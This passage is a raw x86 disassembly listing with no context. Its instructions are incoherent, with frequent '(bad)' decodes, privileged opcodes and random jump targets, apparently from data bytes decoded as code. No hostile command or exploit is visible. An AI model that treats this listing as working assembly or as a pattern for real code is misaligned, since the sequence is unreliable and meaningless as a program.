  41ef1c:	jge    0x41eeac
  41ef1e:	pushf  
  41ef1f:	cs clc 
  41ef21:	cmp    al,0xc0
  41ef23:	add    al,0x1
  41ef25:	cmp    al,0xab
  41ef27:	add    eax,0xb9e4fbc5
  41ef2c:	test   al,0x9f
  41ef2e:	fwait
  41ef2f:	push   0xc4f0b1aa
  41ef34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef35:	and    bl,BYTE PTR ds:0x92c36482
  41ef3b:	xlat   BYTE PTR ds:[ebx]
  41ef3c:	inc    ebx
  41ef3d:	rcr    BYTE PTR [ecx+eax*2+0x25686607],cl
  41ef44:	jb     0x41eecd
  41ef46:	fwait
  41ef47:	jb     0x41ef7c
  41ef49:	jg     0x41efbe
  41ef4b:	pop    es
  41ef4c:	in     eax,0xf3
  41ef4e:	pop    ecx
  41ef4f:	jle    0x41ef82
  41ef51:	dec    esi
  41ef52:	(bad)  
  41ef54:	sub    DWORD PTR [edx],0xffffff89
  41ef57:	mov    al,ds:0x3c8d7826
  41ef5c:	in     al,dx
  41ef5d:	jle    0x41eee1
  41ef5f:	xchg   esp,eax
  41ef60:	mov    bl,0xa9
  41ef62:	retf   
  41ef63:	and    eax,0xe21d2c74
  41ef68:	dec    edi
  41ef69:	into   
  41ef6a:	mov    esp,0x31fbfb04
  41ef6f:	and    DWORD PTR [eax+edx*2-0xa],esi
  41ef73:	lods   eax,DWORD PTR ds:[esi]
  41ef74:	jnp    0x41efc9
  41ef76:	xchg   esi,eax
  41ef77:	fidiv  DWORD PTR [ecx-0x1072bfe]
  41ef7d:	leave  
  41ef7e:	daa    
  41ef7f:	xchg   edx,eax
  41ef80:	(bad)  [ecx+0x73]
  41ef83:	jne    0x41efb3
  41ef85:	xchg   ebx,eax
  41ef86:	adc    al,BYTE PTR [esi+0x56]
  41ef89:	adc    BYTE PTR [esi],0x4a
  41ef8c:	outs   dx,BYTE PTR ds:[esi]
  41ef8d:	mov    WORD PTR [edx],fs
  41ef8f:	cwde   
  41ef90:	pop    eax
  41ef91:	ror    DWORD PTR [ebp+0xb],0xc7
  41ef95:	ins    DWORD PTR es:[edi],dx
  41ef96:	push   es
  41ef97:	loop   0x41ef49
  41ef99:	xchg   edx,eax
  41ef9a:	mov    bh,0x5e
  41ef9c:	retf   0x22c5
  41ef9f:	retf   
  41efa0:	or     eax,0x1d70c941
  41efa5:	or     ebx,edx
  41efa7:	out    0xcc,eax
  41efa9:	pop    esi
  41efaa:	dec    esp
  41efab:	(bad)  
  41efac:	xor    ecx,ebx
  41efae:	loop   0x41ef98
  41efb0:	sbb    bl,BYTE PTR [edx-0x3c]
  41efb3:	retf   0xd1ad
  41efb6:	mov    eax,0x4c6dad40
  41efbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efbc:	in     al,0x93
  41efbe:	sahf   
  41efbf:	shr    esp,0xd
  41efc2:	jp     0x41f00c
  41efc4:	out    dx,al
  41efc5:	and    DWORD PTR [ecx+0x61],edx
  41efc8:	test   eax,0xe60443a5
  41efcd:	call   0x7f43a184
  41efd2:	fxch   st(7)
  41efd4:	outs   dx,BYTE PTR ds:[esi]
  41efd5:	mov    es,WORD PTR [eax]
  41efd7:	dec    eax
  41efd8:	adc    cl,BYTE PTR [esi-0x66246576]
  41efde:	mov    esp,0xa9e6b190
  41efe3:	outs   dx,BYTE PTR ds:[esi]
  41efe4:	test   al,0x45
  41efe6:	ror    dl,0x14
  41efe9:	xchg   ecx,eax
  41efea:	push   ecx
  41efeb:	out    dx,al
  41efec:	popa   
  41efed:	or     BYTE PTR [esi+edi*8+0x4b72ccc],dh
  41eff4:	stos   DWORD PTR es:[edi],eax
  41eff5:	rcr    BYTE PTR [edi+0x79a3a168],cl
  41effb:	mov    bl,0x14
  41effd:	jmp    0x41f026
  41efff:	test   DWORD PTR [ecx+0x17d0fd2e],0x20cd0e9e
  41f009:	cdq    
  41f00a:	mov    es,WORD PTR [edx-0x4f9d0d20]
  41f010:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41f012:	sbb    al,0x8d
  41f014:	adc    edx,DWORD PTR [ebx]
  41f016:	sub    al,0x7e
  41f018:	pop    esi
  41f019:	pop    ds
  41f01a:	outs   dx,DWORD PTR ds:[esi]
  41f01b:	shr    DWORD PTR [eax+0x26],cl
  41f01e:	push   ebx
  41f01f:	popa   
  41f020:	scas   al,BYTE PTR es:[edi]
  41f021:	in     eax,dx
  41f022:	mov    cl,0xe6
  41f024:	(bad)  
  41f025:	mov    bh,0x6
  41f027:	ds nop
  41f029:	xor    esp,DWORD PTR [eax-0x59ad4b4c]
  41f02f:	aad    0xb1
  41f031:	je     0x41f09c
  41f033:	lahf   
  41f034:	fidiv  WORD PTR [eax+0x57]
  41f037:	dec    edx
  41f038:	in     al,dx
  41f039:	or     dh,dl
  41f03b:	cmp    eax,0x2a305af8
  41f040:	xor    ch,ah
  41f042:	adc    al,0x9b
  41f044:	inc    esi
  41f045:	and    BYTE PTR [esi+0x1a],0x14
  41f049:	rcl    DWORD PTR [eax],1
  41f04b:	sar    DWORD PTR [eax+0x6abac041],0x9
  41f052:	mov    eax,ds:0x26e23ea8
  41f057:	xchg   DWORD PTR [esi+0x49c40cef],edi
  41f05d:	jns    0x41f079
  41f05f:	push   cs
  41f060:	xchg   ebx,eax
  41f061:	push   edx
  41f062:	adc    ah,0xfb
  41f065:	xlat   BYTE PTR ds:[ebx]
  41f066:	sub    eax,edx
  41f068:	hlt    
  41f069:	mov    ch,BYTE PTR [ebx]
  41f06b:	pushf  
  41f06c:	xor    esp,DWORD PTR [edx+0x3e]
  41f06f:	div    BYTE PTR [edx-0x20579609]
  41f075:	mov    edx,fs
  41f077:	fbld   TBYTE PTR [eax-0x61dca882]
  41f07d:	int    0xd8
  41f07f:	inc    esp
  41f081:	xchg   ecx,eax
  41f082:	dec    edi
  41f083:	push   cs
  41f084:	mov    edx,0x2a82f8e1
  41f089:	mov    ch,0x2c
  41f08b:	(bad)  
  41f08d:	mov    eax,0x6926cae0
  41f092:	(bad)  
  41f093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f094:	and    eax,0xa6c7cb82
  41f099:	rcl    BYTE PTR ds:0x7bfcdd3b,0xdc
  41f0a0:	(bad)  
  41f0a1:	in     al,dx
  41f0a2:	xor    ecx,ebx
  41f0a4:	lods   al,BYTE PTR ds:[esi]
  41f0a5:	pop    ebx
  41f0a6:	mov    ax,ds:0x56d3b95b
  41f0ac:	cmp    BYTE PTR [edx+0x3f466c13],0xd6
  41f0b3:	(bad)  
  41f0b4:	sysret 
  41f0b6:	nop
  41f0b7:	adc    al,0xac
  41f0b9:	pop    ecx
  41f0ba:	add    ch,BYTE PTR [ecx+edx*2+0x260c95e7]
  41f0c1:	push   ecx
  41f0c2:	jmp    0xfa14:0x834fb37c
  41f0c9:	inc    edi
  41f0ca:	and    BYTE PTR [ecx+eax*2],0x6b
  41f0ce:	out    0xea,eax
  41f0d0:	jl     0x41f133
  41f0d2:	or     DWORD PTR [edi],esi
  41f0d4:	push   cs
  41f0d5:	sbb    ebp,DWORD PTR [ebx+edi*1+0x42]
  41f0d9:	ror    BYTE PTR [edi-0x4a34bcac],cl
  41f0df:	loope  0x41f160
  41f0e1:	std    
  41f0e2:	adc    DWORD PTR [ebp-0x4b23f3b6],eax
  41f0e8:	sub    DWORD PTR [edi-0x3550f9a2],0x581aa2b4
  41f0f2:	push   ss
  41f0f3:	push   ds
  41f0f4:	push   ecx
  41f0f5:	ss (bad) 
  41f0f7:	jp     0x41f079
  41f0f9:	pushf  
  41f0fa:	repnz push ebx
  41f0fc:	addr16 (bad) 
  41f0ff:	add    al,0x78
  41f101:	call   0x4288366e
  41f106:	imul   esp,DWORD PTR [ebx],0x8
  41f109:	enter  0x8e5,0xf7
  41f10d:	lahf   
  41f10e:	popf   
  41f10f:	out    0xd0,al
  41f111:	mov    ah,0xee
  41f113:	arpl   WORD PTR [edi],cx
  41f115:	dec    ebx
  41f116:	pop    ebx
  41f117:	push   ss
  41f118:	sbb    BYTE PTR [ebx-0x63d23697],dh
  41f11e:	xor    BYTE PTR [esi+0x3d],dl
  41f121:	outs   dx,BYTE PTR ds:[esi]
  41f122:	sbb    eax,eax
  41f124:	(bad)  
  41f125:	jae    0x41f12f
  41f127:	mov    ds:0xaa931356,al
  41f12c:	std    
  41f12d:	mov    ecx,0x9b643cec
  41f132:	mov    WORD PTR [esi-0x3b16ecef],fs
  41f138:	out    0x6c,al
  41f13a:	add    edx,esi
  41f13c:	cs scas al,BYTE PTR es:[edi]
  41f13e:	cmc    
  41f13f:	jle    0x41f1bb
  41f141:	jle    0x41f107
  41f143:	pop    ebp
  41f144:	clc    
  41f145:	sbb    DWORD PTR ds:0x4533b54f,ebp
  41f14b:	daa    
  41f14c:	mov    ebx,0xdb6d26b3
  41f151:	pop    es
  41f152:	test   BYTE PTR [edx],al
  41f154:	lea    ecx,ds:0xa033b333
  41f15a:	into   
  41f15b:	and    cl,dh
  41f15d:	sub    dl,0xc4
  41f160:	dec    edx
  41f161:	stc    
  41f162:	rcr    DWORD PTR [edi+0x60949aa],1
  41f168:	jbe    0x41f0f6
  41f16a:	jmp    0x41f1b0
  41f16c:	fsubr  QWORD PTR [ebx]
  41f16e:	pop    ss
  41f16f:	loop   0x41f11a
  41f171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f172:	loope  0x41f158
  41f174:	cmp    esp,DWORD PTR [eax-0x7558bdf1]
  41f17a:	ret    
  41f17b:	push   eax
  41f17c:	daa    
  41f17d:	push   ebp
  41f17e:	or     al,0x9a
  41f180:	outs   dx,BYTE PTR ds:[esi]
  41f181:	push   edi
  41f182:	(bad)  
  41f183:	push   0x9
  41f185:	inc    esi
  41f186:	outs   dx,BYTE PTR ds:[esi]
  41f187:	sbb    DWORD PTR [ebx],eax
  41f189:	fwait
  41f18a:	les    edi,FWORD PTR [ebp+0x57]
  41f18d:	cwde   
  41f18e:	or     al,0x9f
  41f190:	pop    esi
  41f191:	in     al,dx
  41f192:	test   al,0x49
  41f194:	aam    0x73
  41f196:	shl    edx,1
  41f198:	in     al,0x2f
  41f19a:	pop    ebx
  41f19b:	push   esp
  41f19c:	test   edi,esp
  41f19e:	mov    cl,0xb
  41f1a0:	mov    esp,0x324ce8ab
  41f1a5:	mov    WORD PTR [ebx-0x50],ss
  41f1a8:	xor    ecx,edi
  41f1aa:	test   DWORD PTR [esi-0x374ea058],0x8e48ef71
  41f1b4:	jns    0x41f217
  41f1b6:	and    BYTE PTR [esi-0x2c],ah
  41f1b9:	test   BYTE PTR fs:[ebp+edi*2+0x4342865a],ah
  41f1c1:	jmp    0x41f15c
  41f1c3:	add    al,ch
  41f1c5:	cmc    
  41f1c6:	fdiv   DWORD PTR [ebp+0x25]
  41f1c9:	dec    edx
  41f1ca:	cwde   
  41f1cb:	pop    ss
  41f1cc:	push   0x449c2b2f
  41f1d1:	jnp    0x41f1d4
  41f1d3:	jmp    0x4460:0xf0c97803
  41f1da:	xchg   edx,eax
  41f1db:	or     al,BYTE PTR [eax+0x21]
  41f1de:	add    ch,BYTE PTR [edx]
  41f1e0:	push   esp
  41f1e1:	icebp  
  41f1e2:	jmp    DWORD PTR [ecx]
  41f1e4:	jg     0x41f1b3
  41f1e6:	iret   
  41f1e7:	mov    eax,ds:0x835b2fac
  41f1ec:	jns    0x41f1b0
  41f1ee:	icebp  
  41f1ef:	das    
  41f1f0:	jb     0x41f1aa
  41f1f2:	shr    esi,0xc4
  41f1f5:	pushf  
  41f1f6:	push   ebp
  41f1f7:	sbb    dh,BYTE PTR [edx+edi*2-0x42]
  41f1fb:	cmp    eax,0xd7fcdfd0
  41f200:	and    ah,al
  41f202:	xchg   edx,eax
  41f203:	aad    0xad
  41f205:	in     al,dx
  41f206:	iret   
  41f207:	hlt    
  41f208:	sbb    eax,DWORD PTR [ebp*1-0x3b31e11b]
  41f20f:	mov    esp,0xf8f13c2c
  41f214:	stos   DWORD PTR es:[edi],eax
  41f215:	mov    eax,0xf66cfbd2
  41f21a:	fst    DWORD PTR [ebp-0x7b]
  41f21d:	sbb    bh,bh
  41f21f:	repnz loope 0x41f1a5
  41f222:	dec    ebp
  41f223:	jp     0x41f288
  41f225:	mov    esi,0xc3e52b4c
  41f22a:	adc    eax,esp
  41f22c:	rcr    DWORD PTR [ecx+0x794721f],0x75
  41f233:	jle    0x41f292
  41f235:	add    ecx,DWORD PTR ds:0x14b07dc0
  41f23b:	sar    BYTE PTR [ebx+ecx*2],1
  41f23e:	pop    edx
  41f23f:	add    al,0x14
  41f241:	sbb    BYTE PTR [ebp-0x6c],0xcc
  41f245:	push   ecx
  41f246:	mov    gs,WORD PTR [ebx]
  41f248:	fcomp  QWORD PTR [edi+0x35]
  41f24b:	loop   0x41f2a7
  41f24d:	cmp    cl,BYTE PTR [edi]
  41f24f:	mov    ds:0x15ca9291,eax
  41f254:	dec    eax
  41f255:	pop    es
  41f256:	pop    ss
  41f257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f258:	hlt    
  41f259:	mov    edx,0x7e677931
  41f25e:	adc    esi,DWORD PTR [edi+0x36]
  41f261:	or     edi,0x80256e18
  41f267:	dec    edx
  41f268:	std    
  41f269:	dec    esp
  41f26a:	jmp    0x41f22b
  41f26c:	jne    0x41f2c6
  41f26e:	xor    esi,esi
  41f270:	popf   
  41f271:	rcr    DWORD PTR [eax],1
  41f273:	inc    esp
  41f274:	imul   edx,DWORD PTR [edi+edi*2],0xf5c4dc78
  41f27b:	mov    cl,0x4c
  41f27d:	push   esi
  41f27e:	jns    0x41f284
  41f280:	lds    ebp,FWORD PTR [ebp+ebp*1-0x71]
  41f284:	or     eax,0x2e
  41f287:	in     al,dx
  41f288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f289:	sbb    ecx,ecx
  41f28b:	mov    dh,0x5e
  41f28d:	dec    ebx
  41f28e:	and    eax,0xdba5bb19
  41f293:	mov    ds:0x4f2b031f,al
  41f298:	sbb    eax,0x6fc73568
  41f29d:	inc    edx
  41f29e:	xchg   edx,eax
  41f29f:	fs mov al,0x46
  41f2a2:	rol    bl,1
  41f2a4:	jb     0x41f230
  41f2a6:	mov    DWORD PTR [eax],esi
  41f2a8:	int3   
  41f2a9:	in     eax,0x9a
  41f2ab:	sub    al,0xc5
  41f2ad:	push   ebp
  41f2ae:	jae    0x41f26a
  41f2b0:	test   DWORD PTR ds:0xcc04f2c1,ebx
  41f2b6:	imul   edx,DWORD PTR [ebp+0x69],0xffffffb7
  41f2ba:	xchg   ebx,eax
  41f2bb:	pop    ss
  41f2bc:	inc    ebx
  41f2bd:	js     0x41f2dc
  41f2bf:	test   al,0x29
  41f2c1:	or     al,0x34
  41f2c3:	stc    
  41f2c4:	sbb    DWORD PTR [ebx+0x5b],ecx
  41f2c7:	sub    al,0x32
  41f2c9:	cmp    eax,0x71dff35e
  41f2ce:	aad    0xea
  41f2d0:	in     eax,0xc0
  41f2d2:	lods   al,BYTE PTR ds:[esi]
  41f2d3:	inc    edx
  41f2d4:	or     bh,ah
  41f2d6:	xchg   esi,eax
  41f2d7:	mov    ds:0xa8ba6098,al
  41f2dc:	push   edx
  41f2dd:	xchg   esp,eax
  41f2de:	jne    0x41f266
  41f2e0:	add    BYTE PTR [edi-0x317a92d5],dh
  41f2e6:	inc    ebx
  41f2e7:	ds (bad) 
  41f2e9:	xor    cl,BYTE PTR [edx]
  41f2eb:	push   edi
  41f2ec:	or     al,0x13
  41f2ee:	jmp    0x38434da4
  41f2f3:	pop    eax
  41f2f4:	and    ah,BYTE PTR [edi-0x3cc8ccb4]
  41f2fa:	icebp  
  41f2fb:	test   DWORD PTR [ebx],ecx
  41f2fd:	sbb    DWORD PTR [eax-0x1296e772],ebp
  41f303:	cdq    
  41f304:	sub    BYTE PTR [ebp+0x70],al
  41f307:	(bad)
  41f30b:	sub    bh,BYTE PTR ds:[esi]
  41f30e:	cmp    cl,cl
  41f310:	and    DWORD PTR [ebp-0x710de697],edx
  41f316:	sub    al,0x62
  41f318:	cmp    BYTE PTR [esi-0xd283c3f],bh
  41f31e:	xor    edi,DWORD PTR [ebp+0x4a]
  41f321:	mov    edi,ebp
  41f323:	jae    0x41f378
  41f325:	(bad)  
  41f326:	fwait
  41f327:	and    al,0x9
  41f329:	cmp    al,0x5f
  41f32b:	adc    eax,DWORD PTR [ebx-0x7b]
  41f32e:	(bad)  
  41f32f:	sbb    DWORD PTR [esi+edi*2+0x7a32308a],ecx
  41f336:	aaa    
  41f337:	xchg   esp,eax
  41f338:	push   ebp
  41f339:	in     al,0xb8
  41f33b:	xor    BYTE PTR [ecx],cl
  41f33d:	mov    dh,0xc
  41f33f:	push   0x7271543e
  41f344:	mov    ds:0xa17a43e8,al
  41f349:	ins    DWORD PTR es:[edi],dx
  41f34a:	aas    
  41f34b:	jp     0x41f35c
  41f34d:	adc    esp,ecx
  41f34f:	ror    DWORD PTR [ecx+0x3e],0xfd
  41f353:	call   FWORD PTR [edi+0xfb92070]
  41f359:	fstp   st(0)
  41f35b:	jl     0x41f2e0
  41f35d:	(bad)  [ebx-0xb]
  41f360:	mov    ds:0x29343c1f,eax
  41f365:	pextrw edi,(bad),0xc5
  41f367:	mov    edi,0x43e99aee
  41f36c:	and    al,0x35
  41f36e:	(bad)  
  41f370:	in     eax,0x7d
  41f372:	sbb    eax,0xc1efb64e
  41f377:	mov    ch,0x42
  41f379:	cmp    dx,cx
  41f37c:	xlat   BYTE PTR ds:[ebx]
  41f37d:	adc    esi,ebp
  41f37f:	js     0x41f379
  41f381:	cmp    eax,0x7d7daad4
  41f386:	xor    ah,0x1
  41f389:	je     0x41f3ed
  41f38b:	jno    0x41f3df
  41f38d:	mov    al,ds:0x7e10f650
  41f392:	mov    esp,0xc6b0b370
  41f397:	mov    dh,BYTE PTR [edi]
  41f399:	inc    ebx
  41f39a:	or     DWORD PTR [edx+esi*8-0x6431289d],edx
  41f3a1:	push   ss
  41f3a2:	or     eax,0xaa74b330
  41f3a7:	xor    al,BYTE PTR [ecx-0x38d60389]
  41f3ad:	(bad)  
  41f3af:	shl    BYTE PTR [edi],1
  41f3b1:	adc    ebp,esi
  41f3b3:	div    al
  41f3b5:	stc    
  41f3b6:	mov    eax,0xa1a6ace9
  41f3bb:	pop    ecx
  41f3bc:	out    dx,al
  41f3bd:	daa    
  41f3be:	and    bh,BYTE PTR [ecx+0x4f]
  41f3c1:	cmp    dl,al
  41f3c3:	adc    al,dl
  41f3c5:	les    ebp,FWORD PTR [ebp+ecx*8+0x42595351]
  41f3cc:	adc    ecx,DWORD PTR [esi+0x31]
  41f3cf:	mov    ah,0xac
  41f3d1:	or     eax,0x2006feb4
  41f3d6:	sbb    bh,BYTE PTR [eax]
  41f3d8:	call   0x4a06:0x3d79d57a
  41f3df:	ja     0x41f363
  41f3e1:	rcl    DWORD PTR [eax+0x2e469365],0x71
  41f3e8:	gs (bad) 
  41f3ea:	call   0x1f51:0x316d7d16
  41f3f1:	out    dx,eax
  41f3f2:	stos   DWORD PTR es:[edi],eax
  41f3f3:	pop    ecx
  41f3f4:	je     0x41f425
  41f3f6:	inc    edi
  41f3f7:	xchg   esi,eax
  41f3f8:	ds mov eax,0x6f56f1d2
  41f3fe:	adc    BYTE PTR [ebx],dl
  41f400:	ror    DWORD PTR [eax+0x6079283],0xbf
  41f407:	mov    dl,0x9f
  41f409:	or     BYTE PTR [esi],ah
  41f40b:	ds jne 0x41f38f
  41f40e:	jns    0x41f487
  41f410:	das    
  41f411:	push   ecx
  41f412:	sub    al,0xbe
  41f414:	les    esi,FWORD PTR [edx+0x34]
  41f417:	inc    eax
  41f418:	push   ss
  41f419:	popa   
  41f41a:	inc    esp
  41f41b:	hlt    
  41f41c:	cli    
  41f41d:	ficom  DWORD PTR [esi]
  41f41f:	in     eax,dx
  41f420:	cmp    eax,0x31683232
  41f425:	add    BYTE PTR [edi-0x6a],bl
  41f428:	call   0x51c9abe8
  41f42d:	jecxz  0x41f3b0
  41f42f:	imul   eax,DWORD PTR [ecx+0x1f],0x92fe49a9
  41f436:	(bad)  
  41f437:	mov    BYTE PTR [ebx-0x4180bf5f],0xfb
  41f43e:	xchg   BYTE PTR [ebx+0x9830779],ch
  41f444:	rcr    BYTE PTR [ebp+0x6ef749b1],0x75
  41f44b:	fdiv   DWORD PTR [eax+0x1650e180]
  41f451:	sti    
  41f452:	jb     0x41f48f
  41f454:	xor    bh,ch
  41f456:	jg     0x41f44d
  41f458:	je     0x41f4d8
  41f45a:	mov    edx,0x21934d99
  41f45f:	mov    BYTE PTR [edi-0x33],ch
  41f462:	jmp    0xeed9:0x51437677
  41f469:	out    dx,al
  41f46a:	xor    al,0xb7
  41f46c:	jmp    0xe0be4857
  41f471:	mov    esi,0x8528bc40
  41f476:	iret   
  41f477:	mov    ds:0xc40009b,al
  41f47c:	jmp    0x6d4d:0x75bdca2d
  41f483:	repz xchg ecx,eax
  41f485:	imul   ebp,DWORD PTR [si-0x29],0x10aea4f1
  41f48d:	test   al,0x2d
  41f48f:	ret    
  41f490:	out    0xa7,eax
  41f492:	ret    
  41f493:	lea    ebp,[eax-0x78763525]
  41f499:	inc    eax
  41f49a:	pop    es
  41f49b:	inc    edx
  41f49c:	(bad)  
  41f49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f49e:	in     eax,0xd2
  41f4a0:	or     DWORD PTR [edx-0x4b],edi
  41f4a3:	and    eax,0x6cee0f40
  41f4a8:	jbe    0x41f4be
  41f4aa:	add    esp,ebp
  41f4ac:	cs and al,0x5
  41f4af:	(bad)  
  41f4b0:	fidivr WORD PTR [ebx]
  41f4b2:	ret    
  41f4b3:	ret    0x8574
  41f4b6:	cmp    ebp,DWORD PTR [ecx+0x67b32249]
  41f4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4bd:	out    0x9c,eax
  41f4bf:	lds    eax,FWORD PTR [edx-0x5]
  41f4c2:	dec    esi
  41f4c3:	sub    dh,ah
  41f4c5:	mov    ?,WORD PTR [ebp-0x4]
  41f4c8:	adc    BYTE PTR [edi+0x28],0x9b
  41f4cc:	inc    esi
  41f4cd:	adc    ah,BYTE PTR [ebp-0x6e]
  41f4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d1:	icebp  
  41f4d2:	test   al,0x50
  41f4d4:	mov    bl,ch
  41f4d6:	inc    ebx
  41f4d7:	pop    es
  41f4d8:	aam    0xa8
  41f4da:	and    ah,BYTE PTR [ecx]
  41f4dc:	push   ecx
  41f4dd:	push   eax
  41f4de:	lods   al,BYTE PTR ds:[esi]
  41f4df:	daa    
  41f4e0:	icebp  
  41f4e1:	pop    ecx
  41f4e2:	inc    ebx
  41f4e3:	xor    ebp,edx
  41f4e5:	fwait
  41f4e6:	in     eax,dx
  41f4e7:	test   al,0x4b
  41f4e9:	pop    eax
  41f4ea:	push   ebp
  41f4eb:	jnp    0x41f54d
  41f4ed:	stos   BYTE PTR es:[edi],al
  41f4ee:	pop    ebx
  41f4ef:	pop    es
  41f4f0:	cmp    DWORD PTR [edi+0x588a2e2f],esi
  41f4f6:	jl     0x41f4ae
  41f4f8:	xor    BYTE PTR [esi-0x33],0x9b
  41f4fc:	dec    ecx
  41f4fd:	mov    al,BYTE PTR [esi-0x14]
  41f500:	dec    eax
  41f501:	es jle 0x41f4f9
  41f504:	call   0x7e32c891
  41f509:	cdq    
  41f50a:	jmp    0x33fd:0x38c1cdd3
  41f511:	rcl    BYTE PTR [esi+0x725b7ef6],1
  41f517:	and    esi,DWORD PTR [edi-0x3ee6a435]
  41f51d:	ror    DWORD PTR [esi-0x22d9a976],1
  41f523:	ins    BYTE PTR es:[edi],dx
  41f524:	push   0x13
  41f526:	adc    dh,cl
  41f528:	jge    0x41f4ae
  41f52a:	ficomp DWORD PTR [esi]
  41f52c:	(bad)  
  41f52d:	mov    ebx,0x1276c07a
  41f532:	pop    esi
  41f533:	cmp    dh,BYTE PTR [edi]
  41f535:	fistp  DWORD PTR es:[esi+0x3a]
  41f539:	mov    ebx,0xf5a73c00
  41f53e:	ins    BYTE PTR es:[edi],dx
  41f53f:	test   eax,0xb4b28ebb
  41f544:	xchg   BYTE PTR [edi],dh
  41f546:	push   0xfad84136
  41f54b:	dec    esp
  41f54c:	lea    ebp,[edx]
  41f54e:	and    al,0x96
  41f550:	push   ds
  41f551:	dec    ebx
  41f552:	idiv   DWORD PTR [esi]
  41f554:	push   eax
  41f555:	popf   
  41f556:	ror    al,1
  41f558:	ds ins DWORD PTR es:[edi],dx
  41f55a:	mov    ds:0x9f6b0d4c,al
  41f55f:	inc    esp
  41f560:	or     al,BYTE PTR [edx-0x3f]
  41f563:	pop    edi
  41f564:	ret    
  41f565:	outs   dx,BYTE PTR ds:[esi]
  41f566:	fwait
  41f567:	in     al,0x8f
  41f569:	in     al,0x8a
  41f56b:	into   
  41f56c:	sub    esi,esp
  41f56e:	or     eax,0x4ed58960
  41f573:	jmp    0x255ea4ff
  41f578:	push   ecx
  41f57a:	or     ebp,ebx
  41f57c:	inc    esi
  41f57d:	push   ebx
  41f57e:	xor    eax,0xd8a1e484
  41f583:	push   edx
  41f584:	push   eax
  41f585:	(bad)  
  41f586:	test   al,0xbb
  41f588:	add    ebp,esp
  41f58a:	add    BYTE PTR [esi+0x45],cl
  41f58d:	pop    edi
  41f58e:	mov    DWORD PTR [edx-0x76aa6bcd],edi
  41f594:	int    0x8c
  41f596:	shl    ebx,cl
  41f598:	adc    DWORD PTR [esi+0x1bc6b20e],ebx
  41f59e:	sti    
  41f59f:	mov    dl,dh
  41f5a1:	cli    
  41f5a2:	(bad)  
  41f5a4:	in     eax,dx
  41f5a5:	sub    al,0x24
  41f5a7:	or     al,0x2d
  41f5a9:	push   cs
  41f5aa:	fadd   DWORD PTR [ebp+0x56]
  41f5ad:	inc    ecx
  41f5ae:	pusha  
  41f5af:	fst    QWORD PTR [edi-0x792dfeba]
  41f5b5:	jmp    0x41f5a4
  41f5b7:	dec    eax
  41f5b8:	cmp    eax,0x833fd358
  41f5bd:	test   DWORD PTR [esi-0x20],0x72c09be3
  41f5c4:	cmp    DWORD PTR [ecx*4+0x29df3a12],0x1adde5a1
  41f5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5d0:	cli    
  41f5d1:	and    al,0x97
  41f5d3:	cmp    BYTE PTR [eax+0x8deba6],bh
  41f5d9:	mov    ecx,0x580be718
  41f5de:	scas   eax,DWORD PTR es:[edi]
  41f5df:	ficom  WORD PTR [esp+ebx*8]
  41f5e2:	jne    0x41f5ec
  41f5e4:	out    dx,al
  41f5e5:	dec    esp
  41f5e6:	xor    ah,BYTE PTR [edx]
  41f5e8:	call   0xe7d7bc78
  41f5ed:	test   ch,cl
  41f5ef:	stos   BYTE PTR es:[edi],al
  41f5f0:	dec    esi
  41f5f1:	cmp    al,0xae
  41f5f3:	add    esp,ebp
  41f5f5:	je     0x41f670
  41f5f7:	aam    0x9c
  41f5f9:	or     edx,DWORD PTR [edx-0x4b]
  41f5fc:	xchg   ebp,eax
  41f5fd:	repnz xchg esi,eax
  41f5ff:	pop    edx
  41f600:	imul   edx,DWORD PTR [esi+0x5bac0530],0x59
  41f607:	mov    ch,0x52
  41f609:	jp     0x41f591
  41f60b:	movs   WORD PTR es:[edi],WORD PTR gs:[esi]
  41f60e:	shl    DWORD PTR [edx+0x27],cl
  41f611:	lahf   
  41f612:	aas    
  41f613:	(bad)  
  41f615:	jg     0x41f649
  41f617:	sti    
  41f618:	jne    0x41f5d5
  41f61a:	mov    bl,0x32
  41f61c:	and    ebx,edx
  41f61e:	daa    
  41f61f:	jb     0x41f63d
  41f621:	fistp  WORD PTR [edx-0x1f5606f3]
  41f627:	(bad)  [esi+ecx*2]
  41f62a:	xchg   edx,eax
  41f62b:	test   DWORD PTR [edx-0xe],0x2a2be47c
  41f632:	retf   
  41f633:	(bad)  
  41f634:	mov    bh,al
  41f636:	daa    
  41f637:	cmp    esi,DWORD PTR [edi+ecx*4]
  41f63a:	xor    ah,bl
  41f63c:	push   0x1a8b0661
  41f641:	cmc    
  41f642:	ss jp  0x41f67e
  41f645:	adc    al,0xff
  41f647:	push   edi
  41f648:	sbb    al,0xfb
  41f64a:	adc    eax,0x5aac87a2
  41f64f:	push   cs
  41f650:	add    BYTE PTR [eax+0x1ed285fb],cl
  41f656:	je     0x41f657
  41f658:	adc    eax,0x5f8d2fdb
  41f65d:	and    BYTE PTR [edx+0x27],ah
  41f660:	xor    eax,0xf45de485
  41f665:	icebp  
  41f666:	(bad)  
  41f667:	neg    BYTE PTR [ecx-0x60a859af]
  41f66d:	dec    ebx
  41f66e:	int3   
  41f66f:	mov    al,ds:0x428da798
  41f674:	lods   al,BYTE PTR ds:[esi]
  41f675:	jp     0x41f68f
  41f677:	jo     0x41f6c0
  41f679:	(bad)  
  41f67a:	xor    BYTE PTR [eax],ch
  41f67c:	push   esi
  41f67d:	ins    BYTE PTR es:[edi],dx
  41f67e:	mov    WORD PTR [esi+0x37],?
  41f681:	adc    cl,BYTE PTR cs:[esp+edi*4-0x33]
  41f686:	les    ecx,FWORD PTR ds:0x9a3b89
  41f68c:	arpl   WORD PTR [edi-0x11],sp
  41f68f:	shl    BYTE PTR [esi-0x35],1
  41f692:	test   al,0x3d
  41f694:	sbb    eax,0xb96e1a6c
  41f699:	test   edx,0x85f15e39
  41f69f:	clc    
  41f6a0:	sbb    eax,0xfb6760ba
  41f6a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a6:	mov    edi,0xed500bc
  41f6ab:	jno    0x41f709
